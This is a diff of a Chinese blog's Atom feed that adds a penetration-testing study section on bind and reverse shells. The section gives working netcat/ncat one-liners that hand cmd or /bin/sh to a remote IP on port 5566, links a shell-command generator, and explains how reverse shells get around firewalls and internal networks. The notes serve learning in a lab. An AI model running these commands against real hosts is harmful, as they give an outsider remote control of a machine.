@@ -3,11 +3,11 @@
     <id>https://my011215.github.io</id>
     <title>blog小窝 • Posts by &#34;渗透测试&#34; category</title>
     <link href="https://my011215.github.io" />
-    <updated>2023-06-24T03:12:30.000Z</updated>
+    <updated>2023-06-27T03:12:30.000Z</updated>
     <entry>
-        <id>https://my011215.github.io/2023/06/24/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/</id>
+        <id>https://my011215.github.io/2023/06/27/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/</id>
         <title>学习思考</title>
-        <link rel="alternate" href="https://my011215.github.io/2023/06/24/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/"/>
+        <link rel="alternate" href="https://my011215.github.io/2023/06/27/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/"/>
         <content type="html">&lt;!-- toc --&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href=&#34;#%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8&#34;&gt;基础入门&lt;/a&gt;
@@ -15,6 +15,7 @@
 &lt;li&gt;&lt;a href=&#34;#web%E5%BA%94%E7%94%A8&#34;&gt;Web 应用&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;#web%E6%9E%B6%E6%9E%84&#34;&gt;Web 架构&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;#web%E6%9E%B6%E6%9E%84%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9&#34;&gt;web 架构相关内容&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;#%E5%8F%8D%E5%BC%B9shell&#34;&gt;反弹 shell&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -217,8 +218,99 @@ Imperva SecureSphere&lt;/p&gt;
 把浏览器资源分到自己的多台服务器资源上，根据权重分配，这样的话就存在多个目标，IP 就会有多个，但是自然没有 CDN 那么多，而且也不会有就近分配的特点。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#定义负载设置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;upstream fzjh&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	server 47.94.236.117:80 weight=2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	server 47.122.22.195:80 weight=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#定义访问路径 访问策略&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;location / &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    proxy_pass http://fzjh/;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h3&gt;&lt;span id=&#34;反弹-shell&#34;&gt; 反弹 shell&lt;/span&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;命令生成工具&lt;br&gt;
+&lt;a href=&#34;https://forum.ywhack.com/bountytips.php?download&#34;&gt; https://forum.ywhack.com/bountytips.php?download&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ol&gt;
+&lt;li&gt;linux 控制 windows&lt;br&gt;
+widows:  142.112.11.21&lt;br&gt;
+linux:  116.47.21.8&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/393.png?raw=true&#34; alt&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;正向连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;绑定CMD到本地5566端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -e cmd -lvp 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;主动连接目标5566&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ncat 142.112.11.21 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;反向连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//等待5566连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ncat -lvvp 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//绑定CMD到目标5566端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -e cmd 116.47.21.8 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;windows 控制 linux&lt;br&gt;
+widows:  142.112.11.21&lt;br&gt;
+linux:  116.47.21.8&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;正向连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//绑定SH到本地5566端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ncat -e /bin/sh -lvp 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//主动连接目标5566&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 116.47.21.8 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;反向连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;等待5566连接&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//绑定sh到目标5566端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ncat -e /bin/sh 142.112.11.21 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;为什么需要反弹 shell&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;解决数据回显、无图形化问题&lt;br&gt;
+有时候命令执行数据可能不会回显显示，还有就是操作比较麻烦，我们采用反弹 shell 的思路进行连接可以轻松得到对方主机命令界面，获取我们想要的很多数据。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;防火墙绕过（出站入站设置）&lt;br&gt;
+目标机因防火墙受限，目标机器只能发送请求，不能接收请求。&lt;br&gt;
+widows:  142.112.11.21&lt;br&gt;
+linux:  116.47.21.8&lt;br&gt;
+linux 控制 windows&lt;br&gt;
+（1）开启入站策略（入站请求进行过滤）&lt;br&gt;
+这个时候可以考虑出站，既然 L 不能主动连接 W，那么就让 W 把权限放给 L 的端口，L 保持监听。&lt;br&gt;
+反向连接&lt;br&gt;
+ Linux&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ncat -lvvp 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;windows&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -e cmd 116.47.21.8 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;我不敢轻易动本机防火墙配置，把实验改成虚拟机的两台机器，一台 kali，一台 Centos。同样俺们的 kali 充当攻击机的角色。&lt;/p&gt;
+&lt;p&gt;（2）开启出站策略（出战请求过滤）&lt;br&gt;
+这个时候出站严格就要考虑入站，那就 L 主动连接 W 吧。&lt;br&gt;
+正向连接&lt;br&gt;
+ windows&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;绑定CMD到本地5566端口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -e cmd -lvp 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;linux&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;主动连接目标5566&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ncat 142.112.11.21 5566&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;内网服务器、IP 动态变化&lt;br&gt;
+&lt;img src=&#34;https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true&#34; alt&gt;&lt;br&gt;
+如图，如果想要 A 控制 B。&lt;br&gt;
+（1）我们先考虑正向连接，如果 A 给 B 发送连接请求，由于 B 的 IP 是内网 IP 不是和 A 一个局域网的，导致无法连接上，在者就是如果 B 的 IP 是变化的也无法连接。&lt;br&gt;
+（2）我们再考虑反向连接，如果 B 把权限给到 A 的端口，A 保持监听，由于 A 攻击者让 B 发请求肯定是确定 A 的 IP（可以控制），所以不存在连接不上的问题，除非 B 设置了出站策略。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;综上&lt;br&gt;
+（1）目标机因防火墙受限，目标机器只能发送请求，不能接收请求。&lt;br&gt;
+（2）目标机端口被占用。&lt;br&gt;
+（3）目标机位于局域网，或 IP 会动态变化，攻击机无法直接连接。&lt;br&gt;
+（4）对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
 </content>
-        <updated>2023-06-24T03:12:30.000Z</updated>
+        <updated>2023-06-27T03:12:30.000Z</updated>
     </entry>
     <entry>
         <id>https://my011215.github.io/2023/05/05/Penetration%20testing/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
